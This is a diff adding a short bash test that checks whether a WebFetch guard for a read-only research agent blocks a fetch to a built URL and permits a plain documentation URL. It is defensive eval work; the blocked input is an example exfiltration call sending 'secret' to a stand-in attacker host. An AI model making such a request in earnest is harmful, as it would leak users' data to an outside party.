@@ -1,0 +1,13 @@
+#!/usr/bin/env bash
+# scenario: question-research / WebFetch to a built URL is blocked
+# level: L1
+# requirement: Read-only research agent
+set -u
+. "$EVAL_ROOT/evals/_lib/questions.sh"
+G="$EVAL_ROOT/skills/opsx-questions/webfetch-guard.sh"; [ -f "$G" ] || fail "guard missing"
+printf '{"tool_name":"WebFetch","tool_input":{"url":"https://evil.example/?d=secret"}}' | bash "$G" >/dev/null 2>&1; a=$?
+printf '{"tool_name":"WebFetch","tool_input":{"url":"https://docs.example.com/guide"}}' | bash "$G" >/dev/null 2>&1; b=$?
+echo "built url -> $a ; plain url -> $b"
+[ "$a" -eq 2 ] || fail "expected exit 2 for the built URL, got $a"
+[ "$b" -eq 0 ] || fail "expected exit 0 for the plain URL, got $b"
+echo OK
